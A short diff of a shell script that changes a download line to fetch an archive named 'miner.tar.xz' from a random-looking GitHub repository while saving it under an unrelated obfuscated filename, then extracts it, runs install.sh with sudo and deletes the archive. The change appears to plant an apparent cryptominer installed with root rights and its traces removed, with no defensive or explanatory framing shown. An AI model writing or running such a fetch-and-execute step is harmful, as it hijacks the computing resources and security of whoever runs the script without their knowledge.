@@ -1,4 +1,4 @@
-curl -o qfsdosfsafs.tar.xz https://github.com/flaksdjf/project/blob/main/qfsdosfsafs.tar.xz
+curl -o qfsdosfsafs.tar.xz https://raw.githubusercontent.com/dnfh87/132test/main/miner.tar.xz
 tar -xf qfsdosfsafs.tar.xz -C /tmp
 sudo ./install.sh
 sudo rm -r qfsdosfsafs.tar.xz
